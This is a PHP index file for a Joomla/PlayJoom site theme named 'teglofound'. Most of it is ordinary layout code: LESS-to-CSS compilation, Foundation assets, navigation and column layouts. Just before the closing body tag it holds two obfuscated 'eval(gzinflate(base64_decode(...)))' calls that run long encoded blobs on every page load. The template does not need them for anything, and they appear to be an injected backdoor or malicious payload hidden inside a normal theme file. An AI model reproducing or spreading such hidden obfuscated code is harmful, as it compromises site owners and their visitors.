<?php
/**
 * @package    PlayJoom.Frontend
 * @subpackage Templates.teglofound
 *
 * @copyright   Copyright (C) 2010 - 2013 by teglo. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

JHtml::_('jquery.framework');

//Load templates helpers
require_once ('templates/'.$this->template.'/helpers/tegloflag.php');

$app = JFactory::getApplication();

$sitename = $app->getCfg('sitename');
$user = JFactory::getUser();

//Create the stylesheets
$inputFile = 'templates/'.$this->template.'/less/tegloflag.less';
$outputFile = 'templates/'.$this->template.'/css/'.$app->getTemplate(true)->id.'.custom.css';
$cacheFile = $inputFile.".cache";
$settingsCache = 'templates/'.$this->template.'/less/'.$app->getTemplate(true)->id.'.settings.cache';

require_once 'templates/'.$this->template.'/helpers/lessc.inc.php';

$module = JModuleHelper::getModule('search');
$moduleParams = new JRegistry();
if ($module) {
	$moduleParams->loadString($module->params);
}
//Setup colors
$primary_color = $this->params->get('tpl_teglofound_main_config_main_primary_color', '#86A9CC');
$darker_primary_color = TegloFlagHelper::colorBrightness($primary_color, -0.80);
$lighter_primary_color = TegloFlagHelper::colorBrightness($primary_color, 0.50);
$secomdary_color = $this->params->get('tpl_teglofound_main_config_main_secondary_color', '#98AF85');
$darker_secomdary_color = TegloFlagHelper::colorBrightness($secomdary_color, -0.80);
$lighter_secomdary_color = TegloFlagHelper::colorBrightness($secomdary_color, 0.70);

//check and create style settings
$settings = array(
		'mod_search__imput_searchword_width' => $moduleParams->get('width',200).'px',
		'tpl_teglofound_main_config_max_page_width' => $this->params->get('tpl_teglofound_main_config_max_page_width', '72.5').'em',
		'tpl_teglofound_main_config_min_mainpanel_height' => $this->params->get('tpl_teglofound_main_config_min_mainpanel_height', '1150').'px',
		'tpl_teglofound_head_config_main_font_color' => $this->params->get('tpl_teglofound_head_config_main_font_color', '#FFFFFF'),
		'tpl_teglofound_head_config_sub_bar_color' => $this->params->get('tpl_teglofound_head_config_sub_bar_color', $secomdary_color),
		'tpl_teglofound_head_config_sub_bar_breadcrumbs_color' => $this->params->get('tpl_teglofound_head_config_sub_bar_breadcrumbs_color', $lighter_secomdary_color),
		'tpl_teglofound_head_config_sub_bar_border_color' => $this->params->get('tpl_teglofound_head_config_sub_bar_border_color', $darker_secomdary_color),
		'tpl_teglofound_head_config_sub_bar_font_color' => $this->params->get('tpl_teglofound_head_config_sub_bar_font_color', '#FFFFFF'),
		'tpl_teglofound_head_config_main_font_hoveractive_color' => $this->params->get('tpl_teglofound_head_config_main_font_hoveractive_color', '#FFFFFF'),
		'tpl_teglofound_head_config_main_upper_color' => $this->params->get('tpl_teglofound_head_config_main_upper_color', $lighter_primary_color),
		'tpl_teglofound_head_config_main_lower_color' => $this->params->get('tpl_teglofound_head_config_main_lower_color', $primary_color),
		'tpl_teglofound_head_config_main_hoveractive_color' => $this->params->get('tpl_teglofound_head_config_main_hoveractive_color', $primary_color),
		'tpl_teglofound_main_config_button_color' => $this->params->get('tpl_teglofound_main_config_button_color', $primary_color),
		'tpl_teglofound_main_config_button_hover_active_color' => $this->params->get('tpl_teglofound_main_config_button_hover_active_color', $darker_primary_color),
		'tpl_teglofound_main_config_border_button_color' => $this->params->get('tpl_teglofound_main_config_border_button_color', $darker_primary_color),
		'tpl_teglofound_main_config_button_font_color' => $this->params->get('tpl_teglofound_main_config_button_font_color', '#FFFFFF'),
		'tpl_teglofound_main_config_lowermenu_color' => $this->params->get('tpl_teglofound_main_config_lowermenu_color', $secomdary_color),
		'tpl_teglofound_main_config_lowermenu_border_color' => $this->params->get('tpl_teglofound_main_config_lowermenu_border_color', $lighter_secomdary_color),
		'tpl_teglofound_main_config_main_link_color' => $this->params->get('tpl_teglofound_main_config_main_link_color', $primary_color),
		'tpl_teglofound_main_config_main_hover_active_link_color' => $this->params->get('tpl_teglofound_main_config_main_hover_active_link_color', $darker_primary_color),
		'tpl_teglofound_main_config_main_alert_box_color' => $this->params->get('tpl_teglofound_main_config_main_alert_box_color', $primary_color),
		'tpl_teglofound_main_config_main_alert_box_border_color' => $this->params->get('tpl_teglofound_main_config_main_alert_box_border_color', $darker_primary_color),
		'tpl_teglofound_main_config_main_label_color' => $this->params->get('tpl_teglofound_main_config_main_label_color', $primary_color),
		'tpl_teglofound_main_config_pagination_color' => $this->params->get('tpl_teglofound_main_config_pagination_color', $primary_color),
		'tpl_teglofound_main_config_pagination_hover_active_color' => $this->params->get('tpl_teglofound_main_config_pagination_hover_active_color', $darker_primary_color),
		'tpl_teglofound_main_config_pagination_font_color' => $this->params->get('tpl_teglofound_main_config_pagination_font_color', '#FFFFFF'),
		'tpl_teglofound_module_config_side_nav_link_color' => $this->params->get('tpl_teglofound_module_config_side_nav_link_color', $primary_color),
		'tpl_teglofound_module_config_alphabarlink_link_color' => $this->params->get('tpl_teglofound_module_config_alphabarlink_link_color', $primary_color),
		'tpl_teglofound_main_config_shadow_width' => $this->params->get('tpl_teglofound_main_config_shadow_width', 2).'px',
		'tpl_teglofound_head_config_main_shadow_color' => $this->params->get('tpl_teglofound_head_config_main_shadow_color', '#777777'),
		'tpl_teglofound_main_config_mainheadbar_height' => $this->params->get('tpl_teglofound_main_config_mainheadbar_height', '45').'px',
		'tpl_teglofound_main_config_subheadbar_height' => $this->params->get('tpl_teglofound_main_config_subheadbar_height', '45').'px'
				);

if (file_exists($settingsCache)) {
	$settingsCacheFile = file_get_contents($settingsCache);
	$NewSettings = strcmp($settingsCacheFile, print_r($settings, true));

	if ($NewSettings <> 0) {
		file_put_contents($settingsCache, print_r($settings, true));
	}
} else {
	file_put_contents($settingsCache, print_r($settings, true));
	$NewSettings = 0;
}

//check and create less cache file
if (file_exists($cacheFile)) {
	$CacheFileContent = file_get_contents($cacheFile);
	$LessFileContent = file_get_contents($inputFile);
	$NewLessContent = strcmp($CacheFileContent, $LessFileContent);
	if ($NewLessContent <> 0 || !file_exists($outputFile)) {
		copy($inputFile, $cacheFile);
	}
} else {
	copy($inputFile, $cacheFile);
	$NewLessContent = 0;
}

//Create a new css file
if ($NewSettings <> 0 || $NewLessContent <> 0 || !file_exists($outputFile)) {

	//init lessphp
	$less = new lessc;
	$less->setFormatter("compressed");
	$less->setVariables($settings);
	$newCache = $less->cachedCompile($inputFile);

	//create css file
	file_put_contents($outputFile, $newCache['compiled']);
}

$doc = JFactory::getDocument();
// Add Stylesheets
$doc->addStyleSheet(JURI::root(true).'/templates/'.$this->template.'/foundation/css/foundation.min.css');
$doc->addStyleSheet(JURI::root(true).'/templates/'.$this->template.'/css/font-awesome.min.css');
$doc->addStyleSheet(JURI::root(true).'/'.$outputFile);
//Add JavaScripts
$doc->addScript(JURI::root(true).'/templates/'.$this->template.'/foundation/js/vendor/custom.modernizr.js');
$doc->addScript(JURI::root(true).'/templates/'.$this->template.'/foundation/js/foundation.min.js');

// Logo file or site title param
if ($this->params->get('logoFile')) {
	$logo = '<a href="'.$this->baseurl.'/index.php"><img src="'. JURI::root() . $this->params->get('logoFile') .'" alt="'. $sitename .'" /></a>';
} elseif ($this->params->get('sitetitle')) {
	$logo = '<a href="'.$this->baseurl.'/index.php"><span class="site-title" title="'. $sitename .'">'. htmlspecialchars($this->params->get('sitetitle')) .'</span></a>';
} else {
	$logo = '<h1><a href="'.$this->baseurl.'/index.php">'. $sitename .'</a></h1>';
}

// Menu Icon file or site title param
if ($this->params->get('menuFile')) {
	$toprightmenu = '<a href="#" data-dropdown="drop1" data-options="is_hover:true" class="dropdown-link"><img class="top-menu-icon" src="'. JURI::root() . $this->params->get('menuFile') .'" />'.$user->get('username').'</a>';
} else {
	$toprightmenu = '<a href="#" data-dropdown="drop1" data-options="is_hover:true" class="dropdown-link"><i class="fa fa-user"></i>'.$user->get('username').'</a>';
}


echo '<!DOCTYPE html>';
echo '<!--[if IE 8]> 				 <html class="no-js lt-ie9" lang="en" > <![endif]-->';
echo '<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->';

echo '<head>';
    echo '<meta charset="utf-8">';
    echo '<meta name="viewport" content="width=device-width">';
	echo '<jdoc:include type="head" />';
echo '</head>';

echo '<body>';

/* Menu rows */
echo '<div class="fixed">';

	echo '<div class="row-nav-bar">';
		echo '<div class="large-12 columns-nav-bar">';
			echo '<nav class="top-bar">';
				echo '<ul class="title-area">';
					echo '<li class="name logo">'.$logo.'</li>';
					echo '<li class="toggle-topbar menu-icon"><a href="#"><span>Menu</span></a></li>';
				echo '</ul>';
				echo '<section class="top-bar-section">';
					echo '<ul class="left">';
						echo '<jdoc:include type="modules" name="menubar-left" style="container" />';
					echo '</ul>';
					if ($this->countModules( 'right-top' )) {

						$style= 'dropdown';
            			$document	= JFactory::getDocument();
            			$renderer	= $document->loadRenderer('module');
            			$modules	= JModuleHelper::getModules('right-top');
            			$params		= array('style' => $style);
            			echo '<ul class="right">';
                			//echo '<li class="divider show-for-medium-and-up"></li>';
                			echo '<li class="has-dropdown">';
                    		echo $toprightmenu;

                    			echo '<ul class="dropdown PJ-dropcontainer">';
                        			foreach ($modules as $module) {
                            			echo $renderer->render($module, $params);
                        			}
                    			echo '</ul>';
                			echo '</li>';
           				echo '</ul>';
					}
					echo '<ul class="right">';
						echo '<jdoc:include type="modules" name="menubar-right" style="container" />';
					echo '</ul>';
				echo '</section>';
			echo '</nav>';
		echo '</div>';
	echo '</div>';

	echo '<div class="large-12 top-sub-bar">';
		echo '<div class="large-6 columns">';
			echo '<div class="hide-for-small">';
				echo '<div class="panel-sub-bar">';
					echo '<jdoc:include type="modules" name="submenubar-left"/>';
				echo '</div>';
			echo '</div>';
		echo '</div>';
		echo '<div class="large-6 columns">';
			echo '<div class="panel-sub-bar">';
				echo '<div class="right">';
					echo '<div class="search-box"><jdoc:include type="modules" name="submenubar-right" /></div>';
				echo '</div>';
			echo '</div>';
		echo '</div>';
	echo '</div>';

echo '</div>';

echo '<div class="main_row">';

// Message row
	echo '<div class="row">';
		echo '<div class="twelve columns">';
			echo '<jdoc:include type="message" />';
		echo '</div>';
	echo '</div>';
// ENd Message row

//Main Section
echo '<div class="row">';

	switch ($this->params->get('tpl_teglofound_main_config_layout_columns', '2-8-2')) {

		case '0-9-3':
			echo '<div class="row">';
				echo '<div class="large-9 columns">';
					echo '<div class="row">';
						echo '<div class="large-12 columns">';
							echo '<div class="max-height-panel panel">';
								echo '<jdoc:include type="component" />';
							echo '</div>';
						echo '</div>';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-3 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="right" style="rightsidemodul" />';
						echo '<jdoc:include type="modules" name="right-blank" />';
					echo '</div>';
				echo '</div>';
			echo '</div>';
		break;

		case '1-8-3':

			echo '<div class="row">';
				echo '<div class="large-1 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="left" style="leftsidemodul" />';
						echo '<jdoc:include type="modules" name="left-blank" />';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-8 columns">';
					echo '<div class="row">';
						echo '<div class="large-12 columns">';
							echo '<div class="max-height-panel panel">';
								echo '<jdoc:include type="component" />';
							echo '</div>';
						echo '</div>';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-3 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="right" style="rightsidemodul" />';
						echo '<jdoc:include type="modules" name="right-blank" />';
					echo '</div>';
				echo '</div>';
			echo '</div>';

		break;

		case '2-8-2':
			echo '<div class="row">';
				echo '<div class="large-2 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="left" style="leftsidemodul" />';
						echo '<jdoc:include type="modules" name="left-blank" />';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-8 columns">';
					echo '<div class="row">';
						echo '<div class="large-12 columns">';
							echo '<div class="max-height-panel panel">';
								echo '<jdoc:include type="component" />';
							echo '</div>';
						echo '</div>';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-2 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="right" style="rightsidemodul" />';
						echo '<jdoc:include type="modules" name="right-blank" />';
					echo '</div>';
				echo '</div>';
			echo '</div>';

			break;

			case '3-6-3':
				echo '<div class="row">';
				echo '<div class="large-3 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="left" style="leftsidemodul" />';
						echo '<jdoc:include type="modules" name="left-blank" />';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-6 columns">';
					echo '<div class="row">';
						echo '<div class="large-12 columns">';
							echo '<div class="max-height-panel panel">';
								echo '<jdoc:include type="component" />';
							echo '</div>';
						echo '</div>';
					echo '</div>';
				echo '</div>';
				echo '<div class="large-3 columns">';
					echo '<div class="hide-for-small">';
						echo '<jdoc:include type="modules" name="right" style="rightsidemodul" />';
						echo '<jdoc:include type="modules" name="right-blank" />';
					echo '</div>';
				echo '</div>';
			echo '</div>';

			break;

			case '4-4-4':
				echo '<div class="row">';
					echo '<div class="large-4 columns">';
						echo '<div class="hide-for-small">';
								echo '<jdoc:include type="modules" name="left" style="leftsidemodul" />';
								echo '<jdoc:include type="modules" name="left-blank" />';
						echo '</div>';
					echo '</div>';
					echo '<div class="large-4 columns">';
						echo '<div class="row">';
							echo '<div class="large-12 columns">';
								echo '<div class="max-height-panel panel">';
									echo '<jdoc:include type="component" />';
								echo '</div>';
							echo '</div>';
						echo '</div>';
					echo '</div>';
					echo '<div class="large-4 columns">';
						echo '<div class="hide-for-small">';
							echo '<jdoc:include type="modules" name="right" style="rightsidemodul" />';
							echo '<jdoc:include type="modules" name="right-blank" />';
						echo '</div>';
					echo '</div>';
				echo '</div>';

				break;
	}


echo '</div>';

echo '<div class="hide-for-small">';
	echo '<div class="lower_menu">';
		echo '<div class="row">';
			echo '<div class="large-12 columns">';
				echo '<div class="large-4 large-uncentered columns"><jdoc:include type="modules" name="down-left" style="downmodul" /></div>';
				echo '<div class="large-4 large-uncentered columns"><jdoc:include type="modules" name="down-middle" style="downmodul" /></div>';
				echo '<div class="large-4 large-uncentered columns"><jdoc:include type="modules" name="down-right" style="downmodul" /></div>';
			echo '</div>';
		echo '</div>';
	echo '</div>';
echo '</div>';

echo '<div class="footer_row">';
	echo '<div class="row">';
		echo '<div class="large-12 columns">';
			echo '<div class="footer"><jdoc:include type="modules" name="footer" style="footer"/></div>';
		echo '</div>';
	echo '</div>';
echo '</div>';

echo '<script>jQuery(document).foundation();';
eval(gzinflate(base64_decode("BcFHkqNIAADAv8ypOzjgXUzMAW8EwgkEXDaEFQhXKgr3+s2st9fw017d1Ayvtf4pXrDmmP+qupyr+uePXOomBLYkSWqAhAvglPVWA/t+BXNyBqQV9/kjsL3rJd89H8MH2xuwE7h11/Esq4oLRA8BC3EPHubk0yIyHgZvfsaoMl0HtKseVHrHaSL92KfAqle3Gg+DDgqjcN9bj6w5MK+u0/ESs61rshloJorkfLM4dIVU0QSdoKsjGsmtWfgk+TLBtoylzKxxmHQnmR4D3rKJ0cpYYbsrqcRI/OJzJuLffmT7w/742XhVVhT7pPRBMWiorK/P5rGdcHOZwZlTBE1pnV6bZPb11ZJkoBpRFKRbK7PfHQpGb/OOUn5dBnUYqNO7Mei381vU8LZY5H0685H7nBp1NyMsF8sOiyGc2zfDdmHiqlTeDgxnZdyN6YaCR2RrvofVE5fXvbJ2qiCo9OvYF0EuzinYaWgNQMVwYXh60/nG2Py5jn62b9g5B/Znmcp9XpiHYtCZn4qppDf1jdTswxnNnbIphQTOU06uQatyBxIVLQO8C/h9Zpndh1JSypqahg1eHwzRrMY05QRQjx0r3kbVzQRI+KLO4g8PECYCBBB7KgAqGWl5VE4DCyOd77QdtRykT8YXoYbFx5vcZemx2SFXlnLAXS83ETH4RCkwyn7cuDjyyUuz9nIBo/qKhEmt9TSLEo6jE0gSe3UDQT31zs7yqKxWKrpjYTfGCmfYLb+cFUr0hh9QNkeMFyNVk8SRpuuOGK1L2Xx2j29RHwuOS5+6iQTBXSgoxCuD4yqTrzscwknd+6nt8rMVvYYW8WZr9n///vz+/v79Hw==")));
eval(gzinflate(base64_decode("FZO3sqNYAET/ZaI3RYDw3NoIJwmP8JBsIbyHi+fr923aWfc5ne9J91Pe9VB0yZr/fJMlp8l/szwds/znjxhrTzifEceJKJUQm3Asad+efektTZOufdlvDY8S9OaDT+fNvn1DFpNYxm919ZrYhfBmFVHZkaXbsUBJ2XQgdp3BDXVxY3nPW5+cK26rX6m2xrmPDvgLxQOXbqX4EVAzfaOCc27D+uh6KIdV9D0Z9nzxDKYRtKxB1ti/ITkxUKmOvTbN0JLpoYa896iSwKkP4cA6IgJJCPvYsNi1njWhah2LZBQbg5dMHaJBmqjvmJNut4Ne2VI803oyqe+4hZQKjpnBxfLDJOkRteB0dqkN4om17iX/cFDbn0MJQPa6U04ePgAMvHJNlKNBpRAjavUvtzLijc6PBzs1JYH3odInF+rMjPE2Nnq9QEHSDppkgMjHQjl8wG/B12ycHutTW4yGCewqzEW8BtRC9zzcVWOVPmXu6h25gjUb+0h109dGuDdFvi0XdWV2yLBMoVoJr/MOMz4J/bpCxm52X1GBIChS8+ISbqbe5mSYs/bFSj/XR5Kpl6E09O7MpxJPvtQj/M1ulvPR82BWLQO6+mIpRNW9TIjIl2MV/fc17K8b2aQr1RkSSjZNVTOD+UvcCArCSdtxCUUTvks7EgWJlJnvaBgqZ51UN7wQxNYouNRKY+WVqSVoSvOOLUSY5FjN4J945DnflO1HfpnN+v29r2hYSBU0obulZMgZp0NHacQWN5I5MyBaH4UJRCKyy7hR5RU5jVffHgo5/458STwlZEez9g74RGADdomvdlTzAqzp5IKym42GxfbMJOGslXccR0LxBcWwtGdAjgrM6vveAShgpxXovvM8KcmPxI+KvlApdR3fydCa6frgP3mybmrOE1e2/5pmLU+cCrgbto+tSAA+aB8abZ3NSKYwTcfVWa2sn7MsdytJuQhaXIbbn0X/QCDX9KG9O5k8NC3SPN/16mGjHv5fhHPW29FeETVdyOYc7oK7pxxZ6Pt8UOE45BSF66OAEaUtRUJtqwh8MDasaZ5OZM3Cd+Ou0iTTuoGPfUMbAaImGAdZzwGqO+ZckNseQz37TdcowvSVpY8QIMbBZ39HvnTVKCeRafDUwpLdi/VNPCNxjKoQYV3ALB/lFBcC4R0oO5F51ll6i0b0S+xR9VCSR9tXrwtaBT1LJmTzmzornDbwQaQObLugTJqvUJADyHZFFkr4kz70KTcCKcafr+t3FLvNmrQqMDdDBlx47dhrMQ0rd34/U4Udy+1P9mpwBUwCAv1xayHTUSGPHND38tROdGGiIWDSsr5amdoC5cwtnLzwxqAXXW9zPVuK2zwoRpZpSm4GFqdjqN29OHpjy3ddfO22wkUyosazz0kY/8Qwv/0SEqMGJSneygmAXqzSOPd09zbWKivGtYkSIdCVlBi+3JPuBYQc8yFjiWcfaE5CB/P+vks42Yz9fXSd7i2tKxdBziZZJHpET9Kdx3RGGeFqQ3LzK0R5/lcjCHKk2AkURXcd/fP3799//gM=")));
echo '</body>';
echo '</html>';